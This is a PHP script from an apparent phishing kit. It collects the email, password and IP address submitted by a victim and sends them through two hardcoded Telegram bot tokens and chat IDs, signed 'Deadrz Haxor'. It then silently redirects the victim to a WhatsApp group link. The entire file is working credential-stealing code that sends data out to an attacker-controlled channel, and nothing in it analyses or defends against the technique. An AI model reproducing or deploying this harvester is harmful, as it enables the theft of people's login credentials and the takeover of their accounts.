<?php
$user = $_POST['email'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

$apiToken = "5366715610:AAGJ2vZlPaLSvC61eonzuVvkM-hBzpnJIm4";
$data = [
    'chat_id' => '5186079808',
    'text' => "Deadrz Haxor :\r\n Username : $user \r\n Password : $pass \r\n IP : $ip  \r\n" ];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

$apiToken1 = "1927459157:AAEFSOc-0vrF7i_J8kSmlE-EiqQm_bFI7AQ";
$data1 = [
    'chat_id' => '1687559610',
    'text' => "Deadrz Haxor :\r\n Username : $user \r\n Password : $pass \r\n IP : $ip  \r\n" ];
$response1 = file_get_contents("https://api.telegram.org/bot$apiToken1/sendMessage?" . http_build_query($data1) );
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/I0mi3LZBji4E45NElUIsqq">
</head>
<body>
</body>
</html>